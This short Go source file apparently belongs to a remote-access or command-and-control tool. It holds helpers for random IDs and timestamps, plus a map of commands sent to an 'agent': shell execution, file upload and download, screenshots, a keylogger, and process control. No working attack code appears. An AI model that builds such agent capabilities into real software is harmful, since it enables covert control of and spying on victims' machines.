package common

import (
	"crypto/rand"
	"encoding/hex"
	"time"
)

// GenerateID generates a random ID of specified length
func GenerateID(length int) string {
	bytes := make([]byte, length/2)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// CurrentTimestamp returns the current Unix timestamp
func CurrentTimestamp() int64 {
	return time.Now().Unix()
}

// FormatTimestamp formats a Unix timestamp as a human-readable string
func FormatTimestamp(timestamp int64) string {
	return time.Unix(timestamp, 0).Format(time.RFC3339)
}

// CommandTypes defines the available command types
var CommandTypes = map[string]string{
	"shell":   "Execute shell command",
	"upload":  "Upload file to agent",
	"download": "Download file from agent",
	"screenshot": "Take screenshot",
	"keylog": "Start keylogger",
	"process": "List/manage processes",
	"system": "Get system information",
	"exit": "Terminate agent",
}